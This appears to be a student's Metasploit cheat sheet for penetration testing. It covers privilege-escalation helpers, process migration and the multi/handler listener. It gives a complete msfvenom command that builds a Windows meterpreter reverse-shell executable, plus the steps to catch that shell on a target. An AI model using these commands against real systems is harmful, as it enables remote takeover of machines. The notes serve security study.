- always use **local_exploit_suggester** when a session is already connected (CTRL+Z to put session to background, session to list them)
- when meterpreter console, use `getuid` to check current user
- If no access at all, always think about migrating to another process with more privileges (ps + migrate <\nb process>)
- **exploit/multi/handler** to handle payloads and wait for incoming connections

## MFSVenom

Combination of both msfpayload and encoder to create for example meterpreter reverse shell script

Example:
- When nc reverse shell produces instable shell, we may want to have a shell in meterpreter to use the `migrate` command to a more stable process. Therefore we could create a reverse meterpreter shell: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<\myhost> LPORT=<\myport> -f exe > shell.exe` To create a windows reverse shell executable. Then we would use msfconsole `exploit/multi/handler` , set the payload to `windows/meterpreter/reverse_tcp`, run it and run `shell.exe` on the target, migrate immediately